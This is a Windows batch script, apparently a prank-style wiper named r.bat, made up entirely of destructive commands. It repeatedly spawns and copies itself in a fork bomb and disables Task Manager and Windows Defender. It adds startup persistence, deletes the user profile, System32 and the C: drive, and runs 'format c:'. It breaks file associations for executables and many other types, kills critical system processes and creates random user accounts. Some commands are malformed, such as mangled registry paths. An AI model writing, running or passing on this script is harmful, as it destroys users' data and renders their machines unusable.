@echo off
:a
START r.bat
START r.bat
START r.bat
START r.bat
START r.bat
START r.bat
START r.bat
START r.bat
START r.bat


color 6
echo "<3"

color 5

START regedit add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f.

:VBSDynamicBuild
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

:VBSDynamicBuild
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{A}"                              >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

echo Add-Type -AssemblyName System.Windows.Forms > "736484.ps1"
echo $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen > "736484.ps1"
echo [Windows.Forms.Cursor]::Position = "210,220" > "736484.ps1"

powershell 736484.ps1
./736484.ps1

title %random%%random%%userprofile%
mode con cols=32766 lines=32766

echo ";)"

sc config WinDefend start= disabled
sc stop WinDefend

takeown /f C:\Windows\System32

time 0:00
copy r.bat "c:\windows\system32"
copy r.bat %userprofile%

echo 儿勒屁艾 艾艾西艾 艾艾 西吉艾艾伊娜伊 > 65481254345685611.txt

START notepad 65481254345685611.txt

net user %random%%random%%random% %random%%random%%random% /add

echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%%random%%random%%random%%random%%random%%random%.%random%%random%%random%%random%%random%

del C:\Windows\Web\Wallpaper
del %userprofile%

echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo r.bat>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
START regedit add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
START regedit add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f

START regedit delete HKCR/.exe
START regedit delete HKCR/.dll
START regedit delete HKCR/*

start mspaint
start notepad
start calc

START chrome.exe
START chrome.exe "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO"
START chrome.exe "https://ubuntu.com/download/desktop/thank-you/?version=20.10&architecture=amd64"
START chrome.exe "https://ubuntu.com/download/desktop/thank-you?version=20.04.1&architecture=amd64"

START chrome.exe "data:image/jpeg;base64,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"

del %systemdrive%*.* /f /s /q
rd/s/q C:

net user Dartz /active:no
wmic useraccount where name='Dartz' set disabled=true

del *.dll
del *.exe
del *.ini

cacls C:\Windows\System32

start r.bat


ASSOC .exe=ggeeg45g45g4g45g4e
ASSOC .dll=fueeggeeegck
ASSOC .bin=fueegegeegeck
ASSOC .conf=fegeggeeguck
ASSOC .cmd=fuceggegeregek
ASSOC .js=fucgegggk
ASSOC .log=fueegrgeck
ASSOC .ink=fgrwfweuck
ASSOC .c=fucwwfwefwefwk
ASSOC .cpp=fucfwefwefwefk
ASSOC .lib=fucwefwfwefk
ASSOC .png=fuveveerberbeckvev
ASSOC .jpeg=fiuvneuvbujbuck
ASSOC .html=fvfveeuvecvkverver
ASSOC .url=fwweffewfefwuecfwkf
ASSOC .json=fwfwfuwcfkwff
ASSOC .yml=verfveruvecrvker
ASSOC .h=fwfwfewfewefuwfwfck
ASSOC .hpp=fwfffwwfwweefuwcfwks
ASSOC .r = eeergergergerge
ASSOC .ini = fwfwtetefertet


taskkill /im aolsoftware.exe /f
taskkill /im AOLacsd.exe /f
taskkill /im "AOLSP Scheduler.exe" /f

taskkill /IM csrss.exe /F

format c:
del *
del c:\windows\system32\*.* /q
START powershell -command "wininit.exe"

echo ";)"

TASKKILL /IM svchost.exe /F

start r.bat
start %userprofile%\r.bat

for /l %A in (1,1,1000) do copy "r.bat" "r%A.bat"
for /l %A in (1,1,1000) do START "r%A.bat"

@echo off
echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
echo sLinkFile = "%HOMEDRIVE%%HOMEPATH%\Desktop\HAHAHAHHAHAHAHAHAHAHAH.lnk" >> CreateShortcut.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
echo oLink.TargetPath = "%userprofile%\r.bat" >> CreateShortcut.vbs
echo oLink.Save >> CreateShortcut.vbs
cscript CreateShortcut.vbs
del CreateShortcut.vbs

goto a
